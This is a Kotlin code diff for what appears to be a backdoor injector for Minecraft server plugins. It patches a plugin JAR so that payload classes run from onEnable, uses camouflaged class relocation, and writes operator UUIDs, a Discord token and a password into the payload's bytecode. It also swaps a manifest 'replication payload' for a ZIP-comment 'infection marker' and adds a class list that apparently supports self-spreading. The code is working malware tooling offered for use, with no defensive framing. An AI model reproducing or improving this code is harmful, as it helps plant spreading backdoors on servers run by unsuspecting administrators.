@@ -2,26 +2,30 @@ package com.tmquan2508.inject.injector
 
 import com.github.ajalt.mordant.rendering.TextColors.brightCyan
 import com.rikonardo.cafebabe.ClassFile
-import com.rikonardo.cafebabe.data.constantpool.ConstantUtf8
 import com.tmquan2508.inject.cli.Logs
 import com.tmquan2508.inject.utils.generateCamouflagePlan
 import com.tmquan2508.inject.utils.loadDefaultPayload
 import javassist.ClassPool
+import javassist.CtBehavior
 import javassist.CtNewMethod
+import javassist.bytecode.CodeIterator
+import javassist.bytecode.ConstPool
+import javassist.bytecode.Opcode
 import org.yaml.snakeyaml.Yaml
-import java.io.ByteArrayOutputStream
-import java.io.DataOutputStream
-import java.io.File
+import java.io.*
 import java.nio.charset.StandardCharsets
 import java.nio.file.*
 import java.security.MessageDigest
 import java.util.*
-import java.util.jar.Attributes
-import java.util.jar.JarFile
-import java.util.jar.Manifest
+import java.util.zip.ZipEntry
+import java.util.zip.ZipFile
+import java.util.zip.ZipInputStream
+import java.util.zip.ZipOutputStream
 import kotlin.io.path.inputStream
 import kotlin.io.path.name
 import kotlin.io.path.writeBytes
+
+private const val INFECTION_MARKER = "openbd.injected"
 
 fun process(
     input: Path,
@@ -39,15 +43,14 @@ fun process(
     Logs.task("Processing ${input.name}")
 
     try {
-        JarFile(input.toFile()).use { jarFile ->
-            val manifest = jarFile.manifest
-            if (manifest != null && manifest.mainAttributes.getValue("X-Payload-Data") != null) {
-                Logs.finish().warn("Skipped plugin because it is already patched (X-Payload-Data found)")
+        ZipFile(input.toFile()).use { zipFile ->
+            if (zipFile.comment == INFECTION_MARKER) {
+                Logs.finish().warn("Skipped plugin because it is already patched (infection marker found in ZIP comment)")
                 return
             }
         }
     } catch (e: Exception) {
-        Logs.warn("Could not read manifest from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
+        Logs.warn("Could not read ZIP data from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
     }
 
     if (!replace && Files.exists(output)) {
@@ -95,7 +98,6 @@ fun process(
 
             Logs.info("Building and applying dynamic configuration...")
             val finalConfigClassName = masterRelocationMap[originalConfigClassName] ?: originalConfigClassName
-
             val hashedPassword = password?.toSha256() ?: ""
 
             finalClasses = applyConfiguration(
@@ -110,7 +112,6 @@ fun process(
                 warnings = warnings,
                 camouflage = camouflage
             )
-            Logs.info("Configuration applied successfully to final class '$finalConfigClassName'.")
 
             Logs.info("Injecting ${finalClasses.size} final classes...")
             finalClasses.forEach { finalClass ->
@@ -119,8 +120,6 @@ fun process(
                 pathInJar.writeBytes(finalClass.compile())
             }
             Logs.info("All payload classes injected successfully.")
-
-            injectPayloadManifestData(fs, payloadClasses)
 
         } finally {
             fileSystem?.close()
@@ -162,7 +161,10 @@ fun process(
         }
 
         Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
-        Logs.finish().info("${input.name} patched successfully (Payload injected into onEnable)")
+        
+        setInfectionMarker(output)
+
+        Logs.finish().info("${input.name} patched successfully (Payload injected, ZIP comment marker set)")
     } finally {
         if (tempDir.exists()) {
             tempDir.deleteRecursively()
@@ -170,36 +172,29 @@ fun process(
     }
 }
 
-private fun injectPayloadManifestData(fs: FileSystem, originalPayloadClasses: List<ClassFile>) {
-    Logs.info("Injecting replication payload into MANIFEST.MF...")
-    val simpleNamesWithExtension = originalPayloadClasses.map { it.name.substringAfterLast('/') + ".class" }
-    val baos = ByteArrayOutputStream()
-    val dos = DataOutputStream(baos)
-    simpleNamesWithExtension.forEach { name ->
-        val nameBytes = name.toByteArray(StandardCharsets.UTF_8)
-        dos.writeInt(nameBytes.size)
-        dos.write(nameBytes)
+private fun setInfectionMarker(targetJarPath: Path) {
+    Logs.info("Setting infection marker on target ZIP comment...")
+    val tempJarPath = targetJarPath.resolveSibling(targetJarPath.fileName.toString() + ".tmp")
+
+    try {
+        ZipOutputStream(BufferedOutputStream(Files.newOutputStream(tempJarPath))).use { zos ->
+            zos.setComment(INFECTION_MARKER)
+
+            ZipInputStream(BufferedInputStream(Files.newInputStream(targetJarPath))).use { zis ->
+                var entry: ZipEntry? = zis.nextEntry
+                while (entry != null) {
+                    zos.putNextEntry(entry)
+                    zis.copyTo(zos)
+                    zos.closeEntry()
+                    entry = zis.nextEntry
+                }
+            }
+        }
+        Files.move(tempJarPath, targetJarPath, StandardCopyOption.REPLACE_EXISTING)
+        Logs.info("Infection marker set successfully on target JAR.")
+    } catch (e: IOException) {
+        Logs.error("Failed to set infection marker on target JAR: ${e.message}")
     }
-    dos.close()
-
-    val payloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())
-
-    val manifestPath = fs.getPath("META-INF", "MANIFEST.MF")
-    val manifest: Manifest
-    if (Files.exists(manifestPath)) {
-        manifest = Files.newInputStream(manifestPath).use { Manifest(it) }
-    } else {
-        manifest = Manifest()
-        manifest.mainAttributes[Attributes.Name.MANIFEST_VERSION] = "1.0"
-        manifestPath.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
-    }
-
-    manifest.mainAttributes.putValue("X-Payload-Data", payloadBase64)
-
-    Files.newOutputStream(manifestPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING).use {
-        manifest.write(it)
-    }
-    Logs.info("Successfully injected replication data into MANIFEST.MF.")
 }
 
 fun injectIntoOnEnable(jarPath: Path, targetClass: String, codeToInsert: String, saveToDir: String) {
@@ -241,13 +236,35 @@ private fun applyConfiguration(
     warnings: Boolean,
     camouflage: Boolean
 ): List<ClassFile> {
-    val targetFile = classes.find { it.name == targetClassName }
-    if (targetFile == null) {
+    val targetIndex = classes.indexOfFirst { it.name == targetClassName }
+    if (targetIndex == -1) {
         Logs.warn("Could not find configuration target class '$targetClassName' after relocation. Skipping configuration injection.")
         return classes
     }
 
-    val replacements = mapOf(
+    val originalTargetFile = classes[targetIndex]
+    val originalBytecode = originalTargetFile.compile()
+
+    val classNamesForPayload = classes.map { it.name }.sorted()
+    val classlistPayloadBase64: String
+    try {
+        ByteArrayOutputStream().use { baos ->
+            DataOutputStream(baos).use { dos ->
+                classNamesForPayload.forEach { className ->
+                    val nameBytes = className.toByteArray(StandardCharsets.UTF_8)
+                    dos.writeInt(nameBytes.size)
+                    dos.write(nameBytes)
+                }
+            }
+            classlistPayloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())
+            Logs.info("Generated class list payload with ${classNamesForPayload.size} classes.")
+        }
+    } catch (e: IOException) {
+        Logs.error("Failed to generate class list payload: ${e.message}")
+        return classes
+    }
+
+    val placeholders = mapOf(
         "::UUIDS::" to uuids.joinToString(","),
         "::USERNAMES::" to usernames.joinToString(","),
         "::PREFIX::" to prefix,
@@ -255,25 +272,85 @@ private fun applyConfiguration(
         "::WARNINGS::" to warnings.toString(),
         "::DISCORD_TOKEN::" to discordToken,
         "::PASSWORD::" to password,
-        "::CAMOUFLAGE::" to camouflage.toString()
+        "::CAMOUFLAGE::" to camouflage.toString(),
+        "::CLASSLIST::" to classlistPayloadBase64
     )
 
-    var replacedCount = 0
-    for (constant in targetFile.constantPool.entries) {
-        if (constant is ConstantUtf8) {
-            if (replacements.containsKey(constant.value)) {
-                constant.value = replacements[constant.value]!!
-                replacedCount++
+    try {
+        val pool = ClassPool.getDefault()
+        val ctClass = pool.makeClass(ByteArrayInputStream(originalBytecode))
+        ctClass.defrost()
+        val constPool = ctClass.classFile.constPool
+
+        placeholders.forEach { (placeholder, newValue) ->
+            var placeholderIndex = -1
+            for (i in 1 until constPool.size) {
+                if (constPool.getTag(i) == ConstPool.CONST_String && constPool.getStringInfo(i) == placeholder) {
+                    placeholderIndex = i
+                    break
+                }
+            }
+
+            if (placeholderIndex == -1) {
+                if (placeholder != "::USERNAMES::" && placeholder != "::UUIDS::" || (newValue.isNotEmpty())) {
+                     Logs.warn("Could not find placeholder '$placeholder' in constant pool. Skipping replacement.")
+                }
+                return@forEach
+            }
+
+            val newValueIndex = constPool.addStringInfo(newValue)
+            val behaviorsToScan = mutableListOf<CtBehavior>()
+            behaviorsToScan.addAll(ctClass.declaredMethods)
+            ctClass.classInitializer?.let { behaviorsToScan.add(it) }
+
+            var replaced = false
+            for (behavior in behaviorsToScan) {
+                val codeAttribute = behavior.methodInfo.codeAttribute ?: continue
+                val iterator = codeAttribute.iterator()
+                while (iterator.hasNext()) {
+                    val pos = iterator.next()
+                    when (iterator.byteAt(pos)) {
+                        Opcode.LDC -> {
+                            val indexInCode = iterator.byteAt(pos + 1)
+                            if (indexInCode == placeholderIndex) {
+                                iterator.writeByte(newValueIndex, pos + 1)
+                                replaced = true
+                            }
+                        }
+                        Opcode.LDC_W -> {
+                            val indexInCode = iterator.u16bitAt(pos + 1)
+                            if (indexInCode == placeholderIndex) {
+                                iterator.write16bit(newValueIndex, pos + 1)
+                                replaced = true
+                            }
+                        }
+                    }
+                }
+            }
+            if (!replaced && (placeholder == "::CLASSLIST::" || (placeholder == "::UUIDS::" && newValue.isNotEmpty()))) {
+                 Logs.warn("Found placeholder '$placeholder' in pool, but no LDC instruction uses it.")
             }
         }
-    }
+        
+        val modifiedBytecode = ctClass.toBytecode()
+        ctClass.detach()
 
-    if (replacedCount < replacements.size) {
-        Logs.warn("Expected to replace ${replacements.size} placeholders, but only replaced $replacedCount. Ensure the payload's Config.java is compiled with the correct placeholders.")
-    }
+        val modifiedClassFile = ClassFile(modifiedBytecode)
+        modifiedClassFile.name = originalTargetFile.name
 
-    return classes
+        val finalClasses = classes.toMutableList()
+        finalClasses[targetIndex] = modifiedClassFile
+        
+        Logs.info("Successfully applied configuration using Javassist patcher.")
+        return finalClasses
+
+    } catch (e: Exception) {
+        Logs.error("Failed to embed configuration using Javassist: ${e.message}")
+        e.printStackTrace()
+        return classes
+    }
 }
+
 
 private fun buildMasterRelocationMap(
     payloadClasses: List<ClassFile>,
@@ -307,7 +384,7 @@ private fun relocateClasses(classes: List<ClassFile>, relocationMap: Map<String,
         val classFile = ClassFile(originalClassFile.compile())
         classFile.name = relocationMap[classFile.name] ?: classFile.name
         for (constant in classFile.constantPool.entries) {
-            if (constant is ConstantUtf8) {
+            if (constant is com.rikonardo.cafebabe.data.constantpool.ConstantUtf8) {
                 var tempValue = constant.value
                 for (key in sortedKeys) {
                     relocationMap[key]?.let { newValue ->
